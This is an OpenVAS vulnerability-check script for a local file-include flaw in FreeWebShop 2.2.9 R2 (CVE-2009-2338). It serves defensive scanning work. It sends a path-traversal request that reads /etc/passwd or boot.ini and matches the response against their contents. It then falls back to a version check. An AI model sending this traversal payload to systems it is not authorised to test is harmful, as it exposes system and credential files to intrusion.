###############################################################################
# OpenVAS Vulnerability Test
# $Id: FreeWebShop_34538.nasl 8362 2018-01-10 15:35:33Z cfischer $
#
# FreeWebShop 'startmodules.inc.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "FreeWebShop is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to view and execute
arbitrary local files in the context of the webserver process. This
may aid in further attacks.

FreeWebShop 2.2.9 R2 is vulnerable; other versions may also be
affected.";

CPE = "cpe:/a:freewebshop:freewebshop";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100236");
 script_version("$Revision: 8362 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-10 16:35:33 +0100 (Wed, 10 Jan 2018) $");
 script_tag(name:"creation_date", value:"2009-07-21 20:55:39 +0200 (Tue, 21 Jul 2009)");
 script_bugtraq_id(34538);
 script_cve_id("CVE-2009-2338");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_name("FreeWebShop 'startmodules.inc.php' Local File Include Vulnerability");
 script_category(ACT_GATHER_INFO);
 script_tag(name:"qod_type", value:"remote_banner");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("FreeWebShop_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("FreeWebshop/installed");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34538");
 script_xref(name : "URL" , value : "http://www.freewebshop.org");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!infos = get_app_version_and_location( cpe:CPE, port:port)) exit(0);

dir = infos['location'];

if(!isnull(dir)) {
    foreach file (make_list("/etc/passwd", "boot.ini")) {
      url = string(dir, "/includes/startmodules.inc.php?lang_file=../../../../../../../../../../../../", file);
      req = http_get(item:url, port:port);
      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if( buf == NULL )exit(0);

      if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf))
        {
           security_message(port:port);
           exit(0);
        } 
    }
}
 
 # check version because Vulnerability needs 'register_globals = On' and that could be the reason 
 # why file include fail. But we should inform anyway about the Vulnerability if version <=2.2.9_R2.

vers = infos['version'];

 if(!isnull(vers) && vers >!< "unknown") {
    vers = str_replace(find:"_", string: vers, replace:".");
    if(version_is_less_equal(version: vers, test_version: "2.2.9.R2", icase:TRUE)) {
       security_message(port:port);
       exit(0);
     }
  }

exit(0);
